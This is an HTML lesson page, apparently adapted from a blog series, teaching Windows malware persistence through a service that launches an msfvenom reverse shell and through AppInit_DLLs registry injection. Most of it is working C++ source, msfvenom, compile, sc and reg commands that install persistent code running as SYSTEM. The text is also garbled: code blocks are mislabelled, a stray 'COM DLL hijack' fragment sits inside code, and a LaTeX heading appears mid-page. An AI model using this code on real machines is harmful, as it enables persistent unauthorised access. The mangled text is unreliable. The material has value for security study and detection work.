@@ -1,0 +1,396 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 4. Windows services.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #31</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 4. Windows services.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a next part of a series of articles on windows malware persistence techniques and tricks. Today I’ll wrote about the result of self-researching another persistence trick: Windows Services. windows services Windows Services are essential for hacking due to the following reasons:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>They operate natively over the network – the entire Services API was created</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">with remote servers in mind.</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>They start automatically when the system boots.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>They may have extremely high privileges in the operating system.</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Managing services requires high privileges, and an unprivileged user can often only view the settings. This has not changed in over twenty years. In a Windows context, improperly configured services might lead to privilege escalation or be utilized as a persistence technique. So, creating a new service requires Administrator credentials and is not a stealthy persistence approach.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to consider practical example: how to create and run a Windows service that receives a reverse shell for us. First of all create reverse shell exe file via msfvenom from my attacker machine:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp \</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">LHOST=192.168.56.1 LPORT=4445 -f exe > meow.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, create service which run my meow.exe in the target machine. The minimum requirements for a service are the following: - A Main Entry point (like any application)</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>A Service Entry point</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>A Service Control Handler</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the main entry point, you rapidly invoke StartServiceCtrlDispatcher so the SCM may call your Service Entry point (ServiceMain):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">int main() {
+SERVICE_TABLE_ENTRY ServiceTable[] = {
+{"MeowService", (LPSERVICE_MAIN_FUNCTION) ServiceMain},
+{NULL, NULL}
+};
+StartServiceCtrlDispatcher(ServiceTable);
+return 0;
+}
+The Service Main Entry Point performs the following tasks: - Initialize any required</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">things that we postponed from the Main Entry Point.</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Register the service control handler (ControlHandler) that will process Service Stop,</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Pause, Continue, etc. control commands.</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>These are registered as a bit mask via the dwControlsAccepted field of the SERVICE</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">STATUS structure.</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Set Service Status to SERVICE RUNNING. - Perform initialization procedures. Such as</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">creating threads/events/mutex/IPCs, etc. void ServiceMain(int argc, char** argv) { serviceStatus.dwServiceType = SERVICE_WIN32; serviceStatus.dwCurrentState = SERVICE_START_PENDING; serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; serviceStatus.dwWin32ExitCode = 0; serviceStatus.dwServiceSpecificExitCode = 0; serviceStatus.dwCheckPoint = 0; serviceStatus.dwWaitHint = 0; hStatus = RegisterServiceCtrlHandler("MeowService", (LPHANDLER_FUNCTION)ControlHandler); RunMeow(); serviceStatus.dwCurrentState = SERVICE_RUNNING; SetServiceStatus (hStatus, &serviceStatus);</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">while (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
+Sleep(SLEEP_TIME);
+}
+return;
+}
+The Service Control Handler was registered in your Service Main Entry point. Each
+service must have a handler to handle control requests from the SCM:
+void ControlHandler(DWORD request) {
+switch(request) {
+case SERVICE_CONTROL_STOP:
+serviceStatus.dwWin32ExitCode = 0;
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+SetServiceStatus (hStatus, &amp;serviceStatus);
+return;
+case SERVICE_CONTROL_SHUTDOWN:
+serviceStatus.dwWin32ExitCode = 0;
+serviceStatus.dwCurrentState = SERVICE_STOPPED;
+SetServiceStatus (hStatus, &amp;serviceStatus);
+return;
+default:
+break;COM DLL hijack
+}
+SetServiceStatus(hStatus,
+
+&amp;serviceStatus);
+
+return;
+}
+I have only implemented and supported the SERVICE_CONTROL_STOP and
+SERVICE_CONTROL_SHUTDOWN requests. You can handle other requests such as
+SERVICE_CONTROL_CONTINUE, SERVICE_CONTROL_INTERROGATE, SERVICE_CONTROL_PAUSE,
+SERVICE_CONTROL_SHUTDOWN and others.
+Also, create function with evil logic:
+// run process meow.exe - reverse shell
+int RunMeow() {
+void * lb;
+BOOL rv;
+HANDLE th;
+// for example:
+// msfvenom -p windows/x64/shell_reverse_tcp
+// LHOST=192.168.56.1 LPORT=4445 -f exe &gt; meow.exe
+char cmd[] = "Z:\\2022-05-09-malware-pers-4\\meow.exe";
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+ZeroMemory(&amp;si, sizeof(si));
+si.cb = sizeof(si);
+ZeroMemory(&amp;pi, sizeof(pi));
+CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL,
+NULL, &amp;si, &amp;pi);
+WaitForSingleObject(pi.hProcess, INFINITE);
+CloseHandle(pi.hProcess);
+return 0;
+}
+int main() {
+SERVICE_TABLE_ENTRY ServiceTable[] = {
+{"MeowService",
+(LPSERVICE_MAIN_FUNCTION) ServiceMain},
+{NULL, NULL}
+};
+StartServiceCtrlDispatcher(ServiceTable);
+return 0;
+}
+As I wrote earlier, just create our reverse shell process (meow.exe):</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Of course, this code is not reference and it is more “dirty” Proof of Concept.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to demonstration all.</p>
+
+            <div id="compile-our-service" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Compile our service:</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">x86_64-w64-mingw32-g++ -O2 meowsrv.cpp -o meowsrv.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can install the service from the command prompt by running the following command in target machine Windows 10 x64. Remember that all commands run as administrator: sc create MeowService binpath= \ "Z:\2022-05-09-malware-pers-4\meowsrv.exe" \ start= auto</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Check: sc query MeowService</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we open the Process Hacker, we will see it in the Services tab:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we check its properties:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The LocalSystem account is a predefined local account used by the service control manager. It has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects. The name of the account in all locales is .\LocalSystem. The name, LocalSystem or ComputerName\LocalSystem can also be used. This account does not have a password. If you specify the LocalSystem account in a call to the CreateService or ChangeServiceConfig function, any password information you provide is ignored via MSDN. Then, start service via command: sc start MeowService</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And as you can see, we got a reverse shell!:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And our MeowService service got a PID: 5668:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run Process Hacker as non-admin User:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, it doesn’t show us the username. But, running Process Hacker as Administartor changes the situation, and we see that our shell running on behalf NT AUTHORITY\SYSTEM:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We will see it in the Network tab:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, everything is worked perfectly :) Let’s go cleaning after completion of experiments. Stop service: sc stop MeowService</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, MeowService successfully stopped. And if we delete it: sc delete MeowService</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see Process Hacker’s notification about this. But, there is one very important caveat. You might wonder why we just not running command: sc create MeowService \ binpath= "Z:\2022-05-09-pers-4\meow.exe" \ start= auto Because, meow.exe is not actually a service. As I wrote earlier, the minimum requirements for a service are following specific functions: main entry point, service entry point and service control handler. If you try create service from just meow.exe. It’s just terminate with error.</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This technique is not new, but it is worth paying attention to it, especially entry level blue team specialists. Threat actors also can modify existing windows services instead create new ones. In the wild, this trick was often used by groups such as APT 38, APT 32 and APT 41. MITTRE ATT&CK. Create or Modify System Process: Windows Service APT 32 APT 38 APT 41 source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">\subsection{71. malware development: persistence - part 5. AppInit_DLLs. Simple C++ example.}</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a next part of a series of articles on windows malware persistence techniques and tricks. Today I’ll wrote about the result of self-researching another persistence trick: AppInit_DLLs. Windows operating systems have the functionality to allow nearly all application processes to load custom DLLs into their address space. This allows for the possibility of persistence, as any DLL may be loaded and executed when application processes are created on the system. AppInit DLLs Administrator level privileges are necessary to implement this trick. The following registry keys regulate the loading of DLLs via AppInit:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>bit</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">NT\CurrentVersion\Windows - 64-bit We are interested in the following values: reg query \ "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And for 64-bit: reg query \ "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\ Windows" \ /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Microsoft to protect Windows users from malware has disabled by default the loading of DLLs’s via AppInit (LoadAppInit_DLLs). However, setting the registry key LoadAppInit_DLLs to value 1 will enable this feature.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, create “evil” DLL. As usual I will take “meow-meow” messagebox pop-up logic:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil.cpp
+inject via Appinit_DLLs
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/05/16/malware-pers-5.html
+*/
+#include &lt;windows.h&gt;
+
+#pragma comment (lib, "user32.lib")
+extern "C" {
+__declspec(dllexport) BOOL WINAPI runMe(void) {
+MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return TRUE;
+}
+}
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+runMe();
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile it:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then simple logic: changing the registry key AppInit_DLLs to contain the path to the DLL, as a result, evil.dll will be loaded. For this create another app pers.cpp:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows low level persistense via Appinit_DLLs
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+
+2022/05/16/malware-pers-5.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// malicious DLL
+const char* dll = "Z:\\2022-05-16-malware-pers-5\\evil.dll";
+// activation
+DWORD act = 1;
+// 32-bit and 64-bit
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
+0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// create new registry keys
+RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs",
+0, REG_DWORD, (const BYTE*)&amp;act, sizeof(act));
+RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs",
+0, REG_SZ, (unsigned char*)dll, strlen(dll));
+RegCloseKey(hkey);
+}
+res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)
+"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\
+Windows",
+0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// create new registry keys
+RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs",
+0, REG_DWORD, (const BYTE*)&amp;act, sizeof(act));
+RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs",
+0, REG_SZ, (unsigned char*)dll, strlen(dll));
+RegCloseKey(hkey);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, setting the registry key LoadAppInit_DLLs to value 1 is also important. Let’s go to compile it: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">-I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action! Drop all to victim’s machine (Windows 10 x64 in my case). Then run as Administartor: .\pers.exe and: reg query \ "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \ /s reg query \ "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\ Windows" /s just check.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, for demonstration, open something like Paint or Notepad:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, everything is worked perfectly :) second example: However, this method’s implementation may result in stability and performance difficulties on the target system:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Furthermore, I think that the logic of the first DLL’s is considered very odd since multiple message boxes popup, so when we act real-life action in red team scenarios: it’s very noisy, for example for multiple reverse shell connections. I tried updating little bit the logic of evil.dll:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+evil2.cpp
+inject via Appinit_DLLs - only for `mspaint.exe`
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/05/16/malware-pers-5.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+char* subStr(char *str, char *substr) {
+while (*str) {
+char *Begin = str;
+char *pattern = substr;
+while (*str &amp;&amp; *pattern &amp;&amp; *str == *pattern) {
+str++;
+pattern++;
+}
+if (!*pattern)
+return Begin;
+
+str = Begin + 1;
+}
+return NULL;
+}
+extern "C" {
+__declspec(dllexport) BOOL WINAPI runMe(void) {
+MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return TRUE;
+}
+}
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+char path[MAX_PATH];
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+GetModuleFileName(NULL, path, MAX_PATH);
+if (subStr(path, (char *)"paint")) {
+runMe();
+}
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+As you can see, if the current process is paint (and is 32-bits) then, “inject” :)
+
+Perfect! :)
+
+For cleanup, after end of experiments:
+reg add \
+"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
+/v LoadAppInit_DLLs /d 0
+reg add \
+"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
+/v AppInit_DLLs /t REG_SZ /f
+
+This technique is not new, but it is worth paying attention to it, in the wild, this trick
+was often used by groups such as APT 39 and malwares as Ramsay.
+MITRE ATT&amp;CK: APPInit_DLLs
+APT39
+Ramsay
+source code in github</code></pre>
+            </div></main></body></html>
